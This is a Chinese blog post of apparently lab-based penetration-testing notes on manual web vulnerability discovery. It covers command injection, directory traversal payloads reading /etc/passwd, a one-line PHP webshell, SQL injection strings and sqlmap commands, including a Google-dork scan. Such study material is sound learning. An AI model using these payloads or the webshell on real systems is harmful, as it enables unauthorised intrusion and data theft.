<!DOCTYPE HTML>
<html lang="zh-CN">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="Kali渗透测试-Web渗透【手动漏洞挖掘】, 无心">
    <meta name="description" content="手动漏洞挖掘

漏洞挖掘原则
所有变量
所有头
Cookie中的变量


逐个变量删除


漏洞的本质
数据与指令的混淆
对用户输入信息过滤不严判断失误，误将指令当数据


命令执行
应用程序开发者直接调用系统功能
;    &amp;amp;&amp;a">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>Kali渗透测试-Web渗透【手动漏洞挖掘】 | 无心</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>

<meta name="generator" content="Hexo 6.3.0"></head>



   <style>
    body{
       background-image: url(https://cdn.jsdelivr.net/gh/Tokisaki-Galaxy/res/site/medias/background.jpg);
       background-repeat:no-repeat;
       background-size: 100% 100%;
       background-attachment:fixed;
    }
</style>



<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">无心</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>首页</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>标签</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>分类</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>归档</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>关于</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>留言板</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>友情链接</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">无心</div>
        <div class="logo-desc">
            
            你要努力，你想要的，只能你自己给；别人给的，你要问问自己，拿的起吗。
            
        </div>
    </div>

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			首页
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			标签
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			分类
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			归档
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			关于
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			留言板
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			友情链接
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">Kali渗透测试-Web渗透【手动漏洞挖掘】</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/Kali/">
                                <span class="chip bg-color">Kali</span>
                            </a>
                        
                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/">
                                <span class="chip bg-color">漏洞挖掘</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/Kali/" class="post-category">
                                Kali
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2023-01-31
                </div>
                

                

                
                <div class="info-break-policy">
                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
                    5.7k
                </div>
                

                

                
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h2 id="手动漏洞挖掘"><a href="#手动漏洞挖掘" class="headerlink" title="手动漏洞挖掘"></a>手动漏洞挖掘</h2><blockquote>
<ul>
<li>漏洞挖掘原则<ul>
<li>所有变量</li>
<li>所有头<ul>
<li>Cookie中的变量</li>
</ul>
</li>
<li>逐个变量删除</li>
</ul>
</li>
<li>漏洞的本质<ul>
<li>数据与指令的混淆</li>
<li>对用户输入信息过滤不严判断失误，误将指令当数据</li>
</ul>
</li>
<li>命令执行<ul>
<li>应用程序开发者直接调用系统功能</li>
<li>;    &amp;&amp;      |      ||     &amp;</li>
<li>查看源码，过滤用户输入</li>
</ul>
</li>
</ul>
</blockquote>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ul>
<li>加入<code>;</code>或者其他字符进行命令执行</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131193746528.png" alt="image-20230131193746528"></p>
<ul>
<li>若直接输入<code>ls</code>等命令不会输出任何结果</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131194023031.png" alt="image-20230131194023031"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131194051857.png" alt="image-20230131194051857"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131194306224.png" alt="image-20230131194306224"></p>
<blockquote>
<p>可以观察下面的ping命令，<code>ping</code>后面跟的是主机名，而直接输入<code>ls</code>等命令会被误认为是主机名，从而不执行任何操作；分析源码接收客户端输入的ip值赋值给target，先判断是否是windows系统，之后则执行ping + ‘target’，最终将cmd结果显示出来</p>
</blockquote>
<ul>
<li>high级别防护</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131200133049.png" alt="image-20230131200133049"></p>
<blockquote>
<p>target接收到客户端的ip后会进行使用<code>stripslashes()</code>函数删除由 <code>addslashes()</code> 函数添加的反斜杠，之后<code>explode()</code>函数将target以<code>.</code>分割为数组赋值给octet，之后判断octet每一个元素是否是数字，若是四个元素都是数字，则将其再以<code>.</code>拼接起来赋值给target，最后再提交给服务端执行cmd；这时候以上提到的<code>;</code>以及管道符都不能进行绕过，需要其他的方法进行绕过。</p>
</blockquote>
<h2 id="目录遍历-x2F-文件包含"><a href="#目录遍历-x2F-文件包含" class="headerlink" title="目录遍历&#x2F;文件包含"></a>目录遍历&#x2F;文件包含</h2><blockquote>
<ul>
<li>Directory traversal &#x2F; File include（有区别&#x2F;没区别）<ul>
<li>目录权限限制不严 &#x2F; 文件包含</li>
</ul>
</li>
<li>&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php&#x2F;ini<ul>
<li>allow_url_include &#x3D; on</li>
</ul>
</li>
<li>应用程序功能操作文件，限制不严时导致访问WEB目录以外的文件<ul>
<li>读、写文件、远程执行代码</li>
</ul>
</li>
<li>特征但不绝对<ul>
<li>?page&#x3D;a.php</li>
<li>?home&#x3D;b.html</li>
<li>?file&#x3D;content</li>
</ul>
</li>
<li>经典测试方法<ul>
<li>?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</li>
<li>?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd    # 文件系统访问方法，类似URL</li>
<li>?home&#x3D;main.cgi </li>
<li>?page&#x3D;<a target="_blank" rel="noopener" href="http://www.a.com/1.php">http://www.a.com/1.php</a></li>
<li><a target="_blank" rel="noopener" href="http://1.1.1.1/dir/file.txt">http://1.1.1.1/../../../../dir/file.txt</a></li>
</ul>
</li>
<li>编码绕过字符过滤<ul>
<li><code>.</code> ，<code>%00</code>            # 绕过文件扩展名过滤<ul>
<li>?file&#x3D;a.doc%00.php      # 00截断原理</li>
</ul>
</li>
<li>使用多种编码尝试</li>
</ul>
</li>
<li>不同操作系统的路径特征字符<ul>
<li>类unix系统<ul>
<li>根目录：&#x2F;</li>
<li>目录层级分隔符：&#x2F;</li>
</ul>
</li>
<li>windows系统<ul>
<li>C:\</li>
<li>\ 或 &#x2F;</li>
</ul>
</li>
</ul>
</li>
<li>编码（既要能绕过服务器限制，也能够使服务器进行解码）<ul>
<li>url编码、双层url编码<ul>
<li>%2e%2e%2f          # 解码：..&#x2F;</li>
<li>%2e%2e%5c          # 解码：..\</li>
<li>%252e%252e%255c      # 解码：..\</li>
</ul>
</li>
<li>Unicode&#x2F;UTF-8 编码<ul>
<li>..%c0%af                         # 解码：..&#x2F;</li>
<li>..%u2216                     </li>
<li>..%c1%9c                        # 解码：..\</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131204620954.png" alt="image-20230131204620954"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131204926566.png" alt="image-20230131204926566"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230131211209722.png" alt="image-20230131211209722"></p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><blockquote>
<ul>
<li>文件上传漏洞<ul>
<li><?php echo shell_exec($_GET['cmd']);?></li>
</ul>
</li>
<li>直接上传webshell</li>
<li>修改文件类型上传webshell<ul>
<li>Mimetype—文件头、扩展名</li>
</ul>
</li>
<li>修改扩展名上传webshell<ul>
<li>静态解析文件扩展名时可能无法执行</li>
</ul>
</li>
<li>文件头绕过过滤上传webshell</li>
<li>上传目录权限</li>
</ul>
</blockquote>
<p>实操参考文章：</p>
<p><a href="https://noobxw.github.io/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/">https://noobxw.github.io/2022/02/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-upload-labs/</a></p>
<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><blockquote>
<ul>
<li>服务器端程序将用户输入参数作为查询条件，直接拼接SQL语句，并将查询结果返回给客户端浏览器</li>
<li>用户登录判断<ul>
<li>SELECT * FROM users WHERE user&#x3D;‘uname’ AND password&#x3D;‘pass‘</li>
<li>SELECT * FROM users WHERE user&#x3D;‘name’ AND password&#x3D;’’ OR ‘’&#x3D;’‘</li>
</ul>
</li>
<li>盲注<ul>
<li>不显示数据库内建的报错信息<ul>
<li>内建的报错信息帮助开发人员发现和修复问题</li>
<li>报错信息提供关于系统的大量有用信息</li>
</ul>
</li>
<li>当程序员隐藏了数据库内建报错信息，替换为通用的错误提示，sql注入将无法依据报错信息判断注入语句的执行结果</li>
<li>思路：既然无法基于报错信息判断结果，基于逻辑真假的不同结果来判断<ul>
<li>1’ and 1&#x3D;1 –+</li>
<li>1’ and 1&#x3D;2 –+</li>
</ul>
</li>
</ul>
</li>
</ul>
</blockquote>
<p>手工注入：<br><a href="https://noobxw.github.io/categories/SQL%E6%B3%A8%E5%85%A5/">https://noobxw.github.io/categories/SQL%E6%B3%A8%E5%85%A5/</a></p>
<h3 id="SQLMAP自动注入"><a href="#SQLMAP自动注入" class="headerlink" title="SQLMAP自动注入"></a>SQLMAP自动注入</h3><blockquote>
<ul>
<li><p>开源sql注入漏洞检测、利用工具</p>
</li>
<li><p>检测动态页面中get&#x2F;post参数、cookie、http头</p>
</li>
<li><p>数据榨取</p>
</li>
<li><p>文件系统访问</p>
</li>
<li><p>操作系统命令执行</p>
</li>
<li><p>引擎强大、特性丰富</p>
</li>
<li><p>Xss漏洞检测</p>
</li>
<li><p>五种漏洞检测技术</p>
<ul>
<li>基于布尔的盲注检测</li>
<li>基于时间的盲注检测<ul>
<li>‘ and (select * from (select(sleep(20)))a)–+</li>
</ul>
</li>
<li>基于错误的检测</li>
<li>基于UNION联合查询的检测<ul>
<li>适用于通过循环直接输出联合查询结果，否则只显示第一项结果</li>
</ul>
</li>
<li>基于堆叠查询的检测<ul>
<li>;堆叠多个查询语句</li>
<li>适用于非select的数据修改、删除的操作</li>
</ul>
</li>
</ul>
</li>
<li><p>支持的数据库管理系统DBMS</p>
<ul>
<li><p>MySQL，Oracle，PostgreSQL，Microsoft SQL Server，Microsoft Access, IBM DB2, SQLite, </p>
<p>Firebird, Sybase , SAP MaxDB</p>
</li>
</ul>
</li>
</ul>
</blockquote>
<h4 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h4><blockquote>
<p>-u：指定sql注入的URL，其中一定存在变量名称的，例如<code>?id=1</code></p>
<p>-d：直接连接后端数据库，不是通过web端程序代码漏洞去执行sql连接，而是另外打开一个连接去直接连数据库服务器的数据库服务的侦听端口（例如：3306），把自己作为数据库客户端程序来使用</p>
<p>-l：后面跟logfile，logfile可以来自Burp&#x2F;WebScarab这样的代理程序，可以将代理过的访问请求记录日志log文件作为源文件提交给sqlmap，sqlmap会在log文件中逐个URL检查，是否有注入点，是否可以利用</p>
<p>-m：多个需要扫描的url存入文件，进行批量扫描</p>
<p>-r：将http请求头信息以及body数据信息保存为文件统一提交给sqlmap，sqlmap利用其中的内容来进行自己的命令拼接再进行组合指令传输给服务器端</p>
<p>-g：google搜索及如果再使用正则表达式从中过滤想要检查的url，自动完成扫描</p>
<p>-c：可以将sqlmap执行的每一个命令保存为一个配置文件，自动扫描</p>
</blockquote>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201201007230.png" alt="image-20230201201007230"></p>
<h5 id="Get方法"><a href="#Get方法" class="headerlink" title="Get方法"></a>Get方法</h5><ul>
<li>随便输入用户名密码之后可以观察url</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201203257812.png" alt="image-20230201203257812"></p>
<ul>
<li>将地址保存下来使用sqlmap检测</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201203617522.png" alt="image-20230201203617522"></p>
<blockquote>
<p>url地址使用<code>&quot;&quot;</code>引起来，sqlmap在判断那些是变量名称时会存在问题；</p>
<p>-p参数：指定变量进行检测是否存在sql注入漏洞，其他变量不检查</p>
<p>-f：检查数据库的指纹信息</p>
</blockquote>
<ul>
<li>检测结果</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201204224313.png" alt="image-20230201204224313"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201204821654.png" alt="image-20230201204821654"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201204132814.png" alt="image-20230201204132814"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205251848.png" alt="image-20230201205251848"></p>
<blockquote>
<p>sqlmap不仅会检测sql注入漏洞，还会检测xss漏洞；使用的payload如上图；查询结果在<code>/root/.local/share/sqlmap/output/192.168.216.167</code>中</p>
</blockquote>
<ul>
<li>查询当前数据库账号</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205344090.png" alt="image-20230201205344090"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205410348.png" alt="image-20230201205410348"></p>
<ul>
<li>查询banner信息</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205508882.png" alt="image-20230201205508882"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205531287.png" alt="image-20230201205531287"></p>
<ul>
<li>查询目标数据库有哪些库</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205634638.png" alt="image-20230201205634638"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205619053.png" alt="image-20230201205619053"></p>
<ul>
<li>查询源数据库（可再加<code>-a</code>参数查询所有数据甚至进行密码破解）</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205728643.png" alt="image-20230201205728643"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205842330.png" alt="image-20230201205842330"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201205852801.png" alt="image-20230201205852801"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201210139455.png" alt="image-20230201210139455"></p>
<h5 id="作为客户端直接连接数据库"><a href="#作为客户端直接连接数据库" class="headerlink" title="作为客户端直接连接数据库"></a>作为客户端直接连接数据库</h5><ul>
<li><p><code>sqlmap -d &quot;mysql://user:password@192.168.216.167:3306/dvwa&quot; -f --users</code> </p>
<p><code>--banner --dbs --schema -a</code></p>
<blockquote>
<p>这个命令需要知道该数据库的帐号密码以及数据库类型</p>
</blockquote>
</li>
</ul>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201211622555.png" alt="image-20230201211622555"></p>
<p><img src="/2023/01/31/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%8B%E5%8A%A8%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E3%80%91/image-20230201211633184.png" alt="image-20230201211633184"></p>
<ul>
<li><p>扫描URL列表文件</p>
<ul>
<li><code>sqlmap -m list.txt</code></li>
</ul>
</li>
<li><p>扫描google搜索结果</p>
<ul>
<li><p><code>sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></p>
<blockquote>
<p><code>\</code>作为转义符</p>
</blockquote>
